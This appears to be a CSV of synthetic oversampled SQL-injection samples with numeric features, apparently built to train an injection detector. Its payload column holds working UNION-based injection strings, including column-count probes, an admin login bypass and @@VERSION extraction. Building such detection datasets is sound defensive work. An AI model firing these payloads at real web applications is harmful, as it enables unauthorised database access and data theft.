id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000568,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.7120334693844076,35.42788084249462,19.079326713471925,3.8644901789410038,15.586534269438472,7.365386292224612,8.396633567359618,4.079326713471923,0.4309682315418457,0.21662900859484152,0.2364606869628224,0.11594207290049033,0.0,0.0,2.762019859584229,0.0,0.07932671347192363,0.07932671347192355,0.0,0.9206732865280765,0.0,0.0,0.0,2.9206732865280762,0.0,0.0,0.9206732865280763,0.0,0.0,0.07932671347192355,0.9206732865280763,0.0,0.0,0.0,0.0,1.0,1.0,0.07932671347192344,0.07932671347192344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.07932671347192358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.237980140415771
SMOTE_000569,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,0.8051271269783371,89.84725131720604,25.7949083772402,4.119721919650137,27.0,39.07780105376483,11.0,12.769450263441207,0.30746909950054246,0.42648198282897065,0.12526518868540618,0.14078372898508074,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.7694502634412075,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000570,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,1.0544375169224025,41.60155575222926,20.67218669026751,4.089217800093985,16.912808991159213,12.896248920356681,5.56843561062419,6.22406223008917,0.4009286626368498,0.3174163443106054,0.12661997221017937,0.15503502084236548,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.22406223008917014,0.7759377699108297,0.0,1.2240622300891704,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.22406223008917037,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000571,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,3.5422436094025067,76.14050969154499,30.60538226865875,4.439616372860185,32.2107645373175,22.675637114431247,13.39461773134125,7.859490308455001,0.4223010732340073,0.2971564367007991,0.17655822362198156,0.10398426644321208,3.5351274228862497,0.0,1.3946177313412507,0.0,0.0,1.0,0.0,0.4648725771137503,0.0,0.0,1.0,2.859490308455001,1.0,0.0,0.46487257711375024,0.0,0.0,1.0,0.4648725771137503,0.0,0.0,0.0,0.0,1.4648725771137503,1.0,0.4648725771137503,-5.551115123125783e-17,0.5351274228862497,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4648725771137503
SMOTE_000572,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,3.3129073329447976,57.790352946098906,21.930117648699635,3.9607357649516497,29.496392153034186,10.293960793064718,11.713254900866911,6.28674509913309,0.5179509431873943,0.16875345562401178,0.20517486334987187,0.10812073783872199,0.6433725495665449,0.0,1.9301176486996345,0.0,0.3566274504334551,0.3566274504334551,0.0,0.643372549566545,0.0,0.0,1.2867450991330895,2.6433725495665445,0.6433725495665449,0.0,0.6433725495665449,0.0,0.0,0.3566274504334552,0.6433725495665449,0.0,0.0,0.0,0.0,1.0,1.0,0.3566274504334551,0.356627450433455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3566274504334551,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0698823513003655
SMOTE_000573,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,0.9749992252405228,91.31209313355922,25.062418626711843,4.004802912888054,24.96857369120899,42.74989150228246,9.906155064497149,13.687472875570615,0.2704476893544767,0.47194720428385584,0.10614865241833571,0.15145645394333176,0.843736437785307,0.15626356221469273,3.0,0.0,0.0,0.0,0.0,0.8437364377853072,0.1562635622146928,0.0,8.687472875570613,3.0,0.843736437785307,0.15626356221469295,1.0,0.0,0.0,0.0,0.843736437785307,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000574,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.7845342459260547,79.83696050764942,28.80543464974502,4.269168530239411,29.0,24.669568406119545,15.0,11.167392101529886,0.36989710827419003,0.30000115019488793,0.19132609048665003,0.138775651044272,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.1673921015298863,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000575,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.9616270447091755,74.70480454916928,31.11441364750784,4.376455443445619,39.5720682375392,7.313518114952965,16.40960909833856,11.40960909833856,0.529170039216575,0.09857734225642054,0.2195926135206332,0.15266000500637128,0.8855863524921607,0.0,2.2951954508307204,0.0,1.4096090983385599,1.0,0.0,0.2951954508307202,0.0,0.0,1.0,6.40960909833856,0.2951954508307202,0.0,1.0,0.0,0.0,1.0,0.2951954508307202,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.7048045491692797,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.70480454916928
SMOTE_000576,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,2.35281540379869,90.9167368806023,26.972245626867434,4.044278243370332,26.944491253734864,36.0,15.513877186566283,12.458368440301149,0.2959618965562876,0.39639717992000933,0.171005005117045,0.1366359184066581,1.4583684403011485,0.5138771865662839,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.0,4.486122813433716,0.4861228134337161,0.513877186566284,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.486122813433716,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4861228134337163
SMOTE_000577,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.15206370634316368,56.90250960416025,21.0,3.999092199115126,14.0,28.7220076833282,4.0,10.18050192083205,0.2463011901468842,0.504438571823739,0.07037176861339549,0.17888846941598135,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.18050192083205,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000578,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.1173774914020133,71.57101882252195,25.185700627417397,4.229627006953446,27.0,24.456815058017565,11.0,9.11420376450439,0.3853507720631167,0.33187017319739903,0.15699475898867715,0.12578429575080716,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.11420376450439,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000579,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,1.6208786682554666,53.57035736875649,20.523452456252166,3.8728553654887827,32.77861093541162,2.7917464333448727,12.65103169583189,5.3489683041681095,0.6169910523656,0.04576633497286681,0.23784331727283226,0.0993992953887009,0.17448415208405477,0.0,0.5234524562521639,0.0,0.8255158479159453,0.8255158479159453,0.0,0.17448415208405466,0.0,0.0,0.34896830416810953,2.1744841520840543,0.17448415208405466,0.0,0.17448415208405466,0.0,0.0,0.8255158479159455,0.17448415208405466,0.0,0.0,0.0,0.0,1.0,1.0,0.8255158479159453,0.8255158479159452,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8255158479159453,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.476547543747836
SMOTE_000580,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,2.054486508507011,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.6783801608799793,1.3216198391200207,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.6695950402199947,0.3304049597800053,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000581,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.14944571525226982,64.86300908843549,24.786814204081654,4.249039119115232,26.53809744217692,19.57362840816331,10.893407102040827,7.857876136054436,0.40918591167376045,0.30062357093140313,0.16910506629318367,0.12108545110165281,0.9644690340136091,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.893407102040827,3.0,0.9644690340136091,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000582,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.3359319751863452,99.19044409395899,29.209522204697947,4.298197012251459,33.838088818791796,34.514266456375395,16.20952220469795,14.628566614093847,0.34740101828226944,0.3367838959245188,0.16844724683396656,0.14736783895924518,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.628566614093848,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.6047611023489745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.6047611023489745
SMOTE_000583,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.4087575811799748,98.79034058999547,27.79839009833258,3.68852094702222,25.0,39.59678019666516,21.395170294997733,12.798390098332577,0.2534365324147856,0.40091640864394285,0.21615108369544012,0.12949597524583145,0.8991950491662888,0.10080495083371094,3.0,0.0,0.0,1.0,0.0,1.899195049166289,0.0,0.0,5.8991950491662895,4.0,0.8991950491662888,0.10080495083371124,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000584,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,2.1979901747393025,44.36500419648372,19.609706129204923,3.9168870800045714,14.0,17.755298067278794,5.5611754831803,7.0485306460246235,0.3280795508934417,0.37875438334233524,0.13965394051687455,0.15351212524734853,0.6097061292049247,0.0,3.0,0.0,0.0,0.0,0.0,0.3902938707950752,0.6097061292049248,0.0,2.4388245168196985,3.0,0.6097061292049247,0.0,1.0,0.0,0.0,0.0,0.3902938707950754,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000585,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.058057336510466,103.6748570124763,29.433742850623815,4.303006247773652,34.734971402495255,37.20491420748577,16.433742850623815,15.301228551871443,0.3401219712261254,0.34978219423906176,0.16259801259242224,0.1474978219423906,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.301228551871445,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.7168714253119072,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.716871425311908
SMOTE_000586,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.3937111083960773,57.739607754164005,20.8260392245836,3.9468001198561873,14.0,29.391686203331204,4.0,10.347921550832801,0.24341057668877272,0.5079073079734728,0.06954587905393504,0.17913623628381947,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.347921550832801,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000587,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.8336340484596387,41.53163194423318,20.0,4.048776305403914,14.0,16.425305555386544,4.0,7.106326388846636,0.34670868887839623,0.3839495733459245,0.09905962539382748,0.17028211238185176,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.1063263888466364,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000588,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.6179721278159318,85.7850918106963,30.12238969625679,4.3348797770900305,33.489558785027164,24.489558785027164,16.122389696256793,11.683584544385187,0.390534806199405,0.2840007843354316,0.18937133148827284,0.13609307797689058,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.122389696256791,5.5611948481283955,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5611948481283956,2.0,1.0,1.0,0.5611948481283955,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.5611948481283955
SMOTE_000589,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.8906598174296683,77.00750371946079,31.255627789595593,4.484852941502304,33.511255579191186,23.759379649325986,12.744372210404407,6.992496280539211,0.43461803620855594,0.30804643445268665,0.1659686396011806,0.09136688973757688,3.7518759298651974,0.0,0.7443722104044077,0.0,0.0,1.0,0.0,0.24812407013480264,0.0,0.0,1.0,1.9924962805392106,1.0,0.0,0.24812407013480264,0.0,0.0,1.0,0.24812407013480264,0.0,0.0,0.0,0.0,1.2481240701348026,1.0,0.24812407013480264,-5.551115123125783e-17,0.7518759298651974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2481240701348026
SMOTE_000590,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,2.7874674777467368,75.49271498158829,29.492714981588293,4.422540816414017,32.13453140752948,24.641816425941183,11.641816425941185,7.074550722176446,0.4242052050255885,0.326786530639889,0.1542342183900962,0.09477404594442633,2.925449277823554,0.0,1.0745507221764456,0.0,0.0,0.6418164259411847,0.0,0.35818357405881535,0.0,0.0,2.074550722176446,1.7163671481176306,1.0,0.0,0.35818357405881524,0.0,0.0,0.6418164259411847,0.3581835740588153,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.6418164259411847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.641816425941185
SMOTE_000591,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.223981451575407,87.72286226867895,28.0,4.2132627217699286,29.0,30.713989278887542,15.0,13.008872989791413,0.33433148854018585,0.34455204972240944,0.17293008027940648,0.14818638145799823,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.6784973197218855,5.330375670069529,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.33037567006952867,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000592,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,0.042763511552540406,51.06308092044888,20.01261618408978,3.950020698310551,14.0,24.05046473635911,4.0,9.012616184089778,0.2742005837232898,0.4709592995320523,0.07834302392093993,0.17649709282371803,0.9873838159102222,0.012616184089777882,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.012616184089778,3.0,0.9873838159102222,0.012616184089777827,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000593,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.9565814647101084,105.56516026800067,28.0,4.151692471491792,34.782580134000334,38.89129006700017,16.44564503350008,15.445645033500082,0.3286434124588019,0.3689976302369431,0.15593938386160522,0.14641957344264975,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.722822516750041,5.722822516750041,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7228225167500415,2.0,1.0,1.0,0.7228225167500415,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.722822516750042
SMOTE_000594,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.0572258809002129,86.10701750959453,28.394649124520274,4.240898294840605,29.0,29.68561400767562,15.0,12.421403501918906,0.34141697703015506,0.3384984310488938,0.17659498811904575,0.14348960380190537,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.4214035019189053,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000595,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,0.8206538285190215,103.32037026043434,26.305387225375572,3.8446217630161956,25.610774450751148,42.77845109849771,20.931144711185496,14.0,0.24884721994103462,0.4135401290661751,0.2018968641281582,0.13571578686463212,0.4580808380633603,0.8473063873122133,3.0,0.0,0.0,1.0,0.0,1.8473063873122133,0.0,0.0,6.694612774624427,4.152693612687787,0.1526936126877867,0.8473063873122133,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1526936126877867,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.152693612687787
SMOTE_000596,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.7058442434150886,71.45521000125973,25.606946668346303,4.234760991823994,27.30347333417315,23.393053331653697,11.606946668346303,9.151736667086576,0.38204338345875166,0.32774681128990846,0.16217851226469937,0.12803129298664054,1.3034733341731517,0.0,3.0,0.0,0.0,0.15173666708657585,0.0,1.0,0.0,0.0,3.5447899987402725,3.3034733341731517,1.0,0.0,1.0,0.0,0.0,0.15173666708657585,1.0,0.0,0.0,0.0,0.0,1.1517366670865758,1.0,0.1517366670865759,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3034733341731517
SMOTE_000597,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.9140089234815771,76.9952466752814,31.24643500646105,4.484213413890212,33.4928700129221,23.74405834410175,12.75356499353895,7.0047533247186,0.43444390633629154,0.3078924781631846,0.1661183488206274,0.09154526667989647,3.74881166882035,0.0,0.7535649935389501,0.0,0.0,1.0,0.0,0.25118833117965,0.0,0.0,1.0,2.0047533247186005,1.0,0.0,0.25118833117965,0.0,0.0,1.0,0.25118833117965,0.0,0.0,0.0,0.0,1.25118833117965,1.0,0.25118833117964995,-5.551115123125783e-17,0.7488116688203501,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.25118833117965
SMOTE_000598,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.6583337120672579,101.65975425613125,28.0,3.8138603035088865,26.65975425613125,41.65975425613125,19.095430051770308,14.244815692098438,0.26196938165479267,0.40957550532383413,0.18856042418674457,0.13989468883462863,1.8298771280656259,0.0,3.0,0.0,0.0,1.0,0.0,1.585061435967187,0.0,0.0,6.414938564032813,4.414938564032813,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.414938564032813,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4149385640328127
